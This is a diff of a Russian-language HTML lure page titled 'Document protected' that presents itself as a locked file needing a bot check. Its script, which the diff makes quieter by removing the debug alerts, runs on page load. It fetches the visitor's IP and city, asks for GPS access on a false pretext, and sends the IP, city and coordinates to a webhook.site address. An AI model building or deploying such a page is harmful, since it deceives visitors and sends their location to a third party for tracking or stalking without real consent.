@@ -1,28 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Документ защищен</title></head>
-<body style="text-align:center; font-family:sans-serif; padding-top:50px;">
-    <h1 style="color:red;">Документ защищен!</h1>
-    <p>Разрешите доступ, чтобы просмотреть файл.</p>
-    <script>
-    alert("Скрипт запущен! Сейчас узнаем IP...");
+<head>
+    <meta charset="utf-8">
+    <title>Документ защищен</title>
+</head>
+<body style="text-align:center; font-family:sans-serif; margin-top:50px;">
+    <h2 style="color:red;">Документ защищен!</h2>
+    <p>Пожалуйста, разрешите доступ к геолокации, чтобы подтвердить, что вы не робот, и просмотреть файл.</p>
     
-    fetch('https://ipwho.is/').then(r => r.json()).then(d => {
-        alert("IP получен: " + d.ip + ". Сейчас запросим GPS...");
-        
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                alert("GPS получен! Отправляем...");
-                let url = "https://webhook.site/ebd9a3b9-811d-452e-a777-7de543ca450f?ip=" + d.ip + "&city=" + d.city + "&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude;
-                fetch(url, {mode: 'no-cors'});
-            },
-            (err) => {
-                alert("Ошибка GPS: " + err.message);
-                let url = "https://webhook.site/ebd9a3b9-811d-452e-a777-7de543ca450f?ip=" + d.ip + "&city=" + d.city + "&lat=denied&lon=denied";
-                fetch(url, {mode: 'no-cors'});
-            }
-        );
-    }).catch(e => alert("Ошибка сети: " + e.message));
+    <script>
+        // 1. Получаем IP
+        fetch('https://ipwho.is/')
+            .then(res => res.json())
+            .then(data => {
+                let ip = data.ip || '?';
+                let city = data.city || '?';
+                
+                // 2. Запрашиваем GPS
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        let lat = pos.coords.latitude;
+                        let lon = pos.coords.longitude;
+                        sendData(ip, city, lat, lon);
+                    },
+                    (err) => {
+                        sendData(ip, city, 'denied', 'denied');
+                    },
+                    { timeout: 10000 } // Ждем 10 секунд, если GPS тупит
+                );
+            })
+            .catch(() => {
+                // Если IP не получили, все равно просим GPS
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendData('?', '?', pos.coords.latitude, pos.coords.longitude);
+                    },
+                    (err) => {
+                        sendData('?', '?', 'denied', 'denied');
+                    }
+                );
+            });
+
+        // 3. Отправляем данные в Webhook
+        function sendData(ip, city, lat, lon) {
+            let url = "https://webhook.site/ebd9a3b9-811d-452e-a777-7de543ca450f?ip=" + ip + "&city=" + city + "&lat=" + lat + "&lon=" + lon;
+            fetch(url, { mode: 'no-cors' });
+        }
     </script>
 </body>
 </html>
